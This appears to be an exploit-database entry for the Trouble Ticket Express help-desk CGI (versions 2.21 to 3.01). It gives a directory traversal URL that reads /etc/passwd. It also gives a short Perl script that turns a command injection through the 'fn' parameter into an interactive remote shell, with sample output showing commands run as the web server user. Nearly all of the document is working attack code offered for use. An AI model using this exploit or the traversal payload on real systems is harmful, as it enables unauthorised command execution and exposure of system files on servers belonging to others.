# Exploit Title: Trouble Ticket Express Remote Code Execution/Directory Traversal
# Author: zombiefx <darkernet@gmail.com<mailto:darkernet@gmail.com>>
# Software Link: http://www.troubleticketexpress.com/download/ttx301.zip
# Version: v3.01,v3.0,v2.24,v2.21
# Tested on: Linux
# CVE :
# Code:

# This is only possible if an attachment input is available.
# Directory Traversal Vuln is
# http://localhost/cgi-bin/ttx.cgi?cmd=file&fn=../../../../../../etc/passwd
# Simple perl code to run commands on the box
# $ id
# uid=0(httpd) gid=0(httpd) groups=0(httpd)
# $ whoami
# httpd

#!/usr/bin/perl
use warnings;
use strict;
use LWP::Simple;
my $url = 'http://localhost/cgi-bin/ttx.cgi';
print '$ ';
while (<>) {
    print get( $url . '?cmd=file&fn=|' . $_ . '|' );
    print '$ ';
}
<mailto:darkernet@gmail.com>